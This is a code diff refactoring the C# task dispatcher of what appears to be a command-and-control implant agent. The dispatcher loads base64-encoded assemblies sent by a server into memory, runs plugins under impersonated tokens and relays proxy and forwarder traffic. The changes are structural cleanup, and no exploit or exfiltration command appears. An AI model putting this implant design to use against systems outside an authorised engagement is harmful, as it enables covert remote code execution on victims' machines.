@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 using System.Security.Principal;
@@ -32,224 +32,157 @@ namespace Agent.Managers
         public async Task StartTaskAsync(ServerJob job)
         {
             this.messageManager.AddJob(job);
-            TaskResponse rr = new TaskResponse()
-            {
-                task_id = job.task.id,
-                status = "completed",
-                user_output = ""
-            };
             switch (job.task.command)
             {
                 case "load":
-                    LoadCommand? loadCommand;
-                    try
-                    {
-                        loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
-                    }
-                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
-                    {
-                        FailMalformedLoad(job, e.Message);
-                        break;
-                    }
-
-                    if (loadCommand is null)
-                    {
-                        FailMalformedLoad(job, "Load parameters cannot be null.");
-                        break;
-                    }
-
-                    if (string.IsNullOrWhiteSpace(loadCommand.command) || string.IsNullOrWhiteSpace(loadCommand.asm))
-                    {
-                        FailMalformedLoad(job, "Plugin command and assembly payload are required.");
-                        break;
-                    }
-
-                    byte[] loadBuffer;
-                    try
-                    {
-                        loadBuffer = Misc.Base64DecodeToByteArray(loadCommand.asm);
-                    }
-                    catch (FormatException e)
-                    {
-                        FailMalformedLoad(job, e.Message);
-                        break;
-                    }
-                    if (loadBuffer.Length == 0)
-                    {
-                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
-                        break;
-                    }
-
-                    if (this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, loadBuffer))
-                    {
-                        LoadTaskResponse cr = new LoadTaskResponse()
-                        {
-                            completed = true,
-                            user_output = $"Loaded plugin {loadCommand.command}",
-                            task_id = job.task.id,
-                            commands = new List<CommandsResponse>()
-                            {
-                                new CommandsResponse()
-                                {
-                                    action = "add",
-                                    cmd = loadCommand.command,
-                                }
-                            }
-                        };
-                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
-                    }
-                    else
-                    {
-                        LoadTaskResponse cr = new LoadTaskResponse()
-                        {
-                            completed = true,
-                            user_output = $"Failed to load plugin {loadCommand.command}",
-                            task_id = job.task.id,
-                            commands = new List<CommandsResponse>()
-                        };
-                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
-                    }
+                    HandleLoadPlugin(job);
                     break;
                 case "load-assembly":
-                    LoadCommand? command;
-                    try
-                    {
-                        command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
-                    }
-                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
-                    {
-                        FailMalformedLoad(job, e.Message);
-                        break;
-                    }
-
-                    if (command is null)
-                    {
-                        FailMalformedLoad(job, "Load parameters cannot be null.");
-                        break;
-                    }
-
-                    if (string.IsNullOrWhiteSpace(command.asm))
-                    {
-                        FailMalformedLoad(job, "Assembly payload is required.");
-                        break;
-                    }
-
-                    byte[] assemblyBuffer;
-                    try
-                    {
-                        assemblyBuffer = Misc.Base64DecodeToByteArray(command.asm);
-                    }
-                    catch (FormatException e)
-                    {
-                        FailMalformedLoad(job, e.Message);
-                        break;
-                    }
-                    if (assemblyBuffer.Length == 0)
-                    {
-                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
-                        break;
-                    }
-
-                    this.assemblyManager.LoadAssemblyAsync(job.task.id, assemblyBuffer);
+                    HandleLoadAssembly(job);
                     break;
                 default:
-                    _ = Task.Run(async () =>
-                    {
-                        if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin plug))
-                        {
-                            this.messageManager.AddTaskResponse(new TaskResponse()
-                            {
-                                task_id = job.task.id,
-                                user_output = "Plugin not found. Please load it.",
-                                status = "error",
-                                completed = true,
-                            });
-                            return;
-                        }
-
-                        if(job.task.token == 0)
-                        {
-                            try
-                            {
-                                await plug.Execute(job);
-                            }
-                            catch (Exception e)
-                            {
-                                this.messageManager.AddTaskResponse(new TaskResponse()
-                                {
-                                    task_id = job.task.id,
-                                    user_output = e.ToString(),
-                                    status = "error",
-                                    completed = true,
-                                });
-                            }
-                            return;
-                        }
-
-                        try
-                        {
-                            tokenManager.RunTaskImpersonated(plug, job);
-                        }
-                        catch (Exception e)
-                        {
-                            this.messageManager.AddTaskResponse(new TaskResponse()
-                            {
-                                task_id = job.task.id,
-                                user_output = e.ToString(),
-                                status = "error",
-                                completed = true,
-                            });
-                        }
-                        return;
-                    });
-                            
+                    _ = Task.Run(() => ExecutePluginTaskAsync(job));
                     break;
             }
         }
 
-        private void FailMalformedLoad(ServerJob job, string error)
+        private void HandleLoadPlugin(ServerJob job)
         {
+            if (!TryParseLoadPayload(job, requireCommand: true, out LoadCommand command, out byte[] loadBuffer))
+                return;
+
+            bool loaded = this.assemblyManager.LoadPluginAsync(job.task.id, command.command, loadBuffer);
+            var response = new LoadTaskResponse
+            {
+                completed = true,
+                user_output = loaded
+                    ? $"Loaded plugin {command.command}"
+                    : $"Failed to load plugin {command.command}",
+                task_id = job.task.id,
+                commands = loaded
+                    ? [new CommandsResponse { action = "add", cmd = command.command }]
+                    : [],
+            };
+            this.messageManager.AddTaskResponse(response.ToJson(), job.task.id, response.completed);
+        }
+
+        private void HandleLoadAssembly(ServerJob job)
+        {
+            if (!TryParseLoadPayload(job, requireCommand: false, out _, out byte[] assemblyBuffer))
+                return;
+
+            this.assemblyManager.LoadAssemblyAsync(job.task.id, assemblyBuffer);
+        }
+
+        private bool TryParseLoadPayload(
+            ServerJob job,
+            bool requireCommand,
+            out LoadCommand command,
+            out byte[] payload)
+        {
+            command = null!;
+            payload = [];
+            LoadCommand? parsed;
+            try
+            {
+                parsed = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
+            }
+            catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
+            {
+                return FailMalformedLoad(job, e.Message);
+            }
+
+            if (parsed is null)
+                return FailMalformedLoad(job, "Load parameters cannot be null.");
+
+            if (requireCommand && (string.IsNullOrWhiteSpace(parsed.command) || string.IsNullOrWhiteSpace(parsed.asm)))
+                return FailMalformedLoad(job, "Plugin command and assembly payload are required.");
+
+            if (!requireCommand && string.IsNullOrWhiteSpace(parsed.asm))
+                return FailMalformedLoad(job, "Assembly payload is required.");
+
+            try
+            {
+                payload = Misc.Base64DecodeToByteArray(parsed.asm);
+            }
+            catch (FormatException e)
+            {
+                return FailMalformedLoad(job, e.Message);
+            }
+
+            if (payload.Length == 0)
+                return FailMalformedLoad(job, "Assembly payload cannot be empty.");
+
+            command = parsed;
+            return true;
+        }
+
+        private async Task ExecutePluginTaskAsync(ServerJob job)
+        {
+            if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin? plug) || plug is null)
+            {
+                AddErrorTaskResponse(job.task.id, "Plugin not found. Please load it.");
+                return;
+            }
+
+            try
+            {
+                if (job.task.token == 0)
+                    await plug.Execute(job);
+                else
+                    tokenManager.RunTaskImpersonated(plug, job);
+            }
+            catch (Exception e)
+            {
+                AddErrorTaskResponse(job.task.id, e.ToString());
+            }
+        }
+
+        private bool FailMalformedLoad(ServerJob job, string error)
+        {
+            AddErrorTaskResponse(job.task.id, error);
+            this.messageManager.CompleteJob(job.task.id);
+            return false;
+        }
+
+        private void AddErrorTaskResponse(string taskId, string error) =>
             this.messageManager.AddTaskResponse(new TaskResponse
             {
-                task_id = job.task.id,
+                task_id = taskId,
                 user_output = error,
                 status = "error",
                 completed = true,
             });
-            this.messageManager.CompleteJob(job.task.id);
+
+        private bool TryResolveJobPlugin<T>(string taskId, out ServerJob job, out T plugin) where T : IPlugin
+        {
+            job = null!;
+            plugin = default!;
+            if (!this.messageManager.TryGetJob(taskId, out ServerJob? foundJob) || foundJob is null ||
+                !this.assemblyManager.TryGetPlugin(foundJob.task.command, out T? foundPlugin) || foundPlugin is null)
+            {
+                return false;
+            }
+
+            job = foundJob;
+            plugin = foundPlugin;
+            return true;
         }
 
         public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
         {
             List<Task> tasks = new List<Task>();
-            foreach(var response in responses)
+            foreach (var response in responses)
             {
-                if (response is null)
+                if (response is null || !TryResolveJobPlugin(response.task_id, out ServerJob job, out IFilePlugin plugin))
                 {
                     continue;
                 }
 
-                ServerJob job;
-
-                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
-                {
-                    continue;
-                }
-
-                if(plugin is null)
-                {
-                    continue;
-                }
-
-                if (job.task.token > 0)
-                {
-                    tasks.Add(HandleFileResponse(
-                        () => tokenManager.HandleFilePluginImpersonated(plugin, job, response),
-                        response.task_id));
-                    continue;
-                }
-
-                tasks.Add(HandleFileResponse(() => plugin.HandleNextMessage(response), response.task_id));
+                Func<Task> dispatch = job.task.token > 0
+                    ? () => tokenManager.HandleFilePluginImpersonated(plugin, job, response)
+                    : () => plugin.HandleNextMessage(response);
+                tasks.Add(HandleFileResponse(dispatch, response.task_id));
             }
 
             await Task.WhenAll(tasks);
@@ -268,12 +201,7 @@ namespace Agent.Managers
         }
         public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
         {
-            if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
-            {
-                return;
-            }
-
-            if (plugin is null || responses is null)
+            if (responses is null || !this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin) || plugin is null)
             {
                 return;
             }
@@ -319,6 +247,11 @@ namespace Agent.Managers
                 return;
             }
 
+            await ReleaseProxySlotWhenComplete(handling).ConfigureAwait(false);
+        }
+
+        private async Task ReleaseProxySlotWhenComplete(Task handling)
+        {
             try
             {
                 await handling.ConfigureAwait(false);
@@ -332,37 +265,14 @@ namespace Agent.Managers
                 proxyHandlerSlots.Release();
             }
         }
-
-        private async Task ReleaseProxySlotWhenComplete(Task handling)
-        {
-            try
-            {
-                await handling.ConfigureAwait(false);
-            }
-            catch
-            {
-            }
-            finally
-            {
-                proxyHandlerSlots.Release();
-            }
-        }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
         {
             List<Task> tasks = new List<Task>();
-            foreach(var response in responses)
+            foreach (var response in responses)
             {
-                if (response is null)
-                {
-                    continue;
-                }
-
-                if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
-                {
-                    continue;
-                }
-
-                if (plugin is null)
+                if (response is null
+                    || !this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin)
+                    || plugin is null)
                 {
                     continue;
                 }
@@ -375,19 +285,13 @@ namespace Agent.Managers
             }
             await Task.WhenAll(tasks);
         }
+
         public async Task HandleInteractiveResponses(List<InteractMessage> responses)
         {
             List<Task> tasks = new List<Task>();
-            foreach(var response in responses)
+            foreach (var response in responses)
             {
-                if (response is null)
-                {
-                    continue;
-                }
-
-                ServerJob job;
-
-                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
+                if (response is null || !TryResolveJobPlugin(response.task_id, out ServerJob job, out IInteractivePlugin plugin))
                 {
                     continue;
                 }
@@ -405,7 +309,6 @@ namespace Agent.Managers
                 catch { }
             }
 
-            //I might not need this
             await Task.WhenAll(tasks);
         }
     }
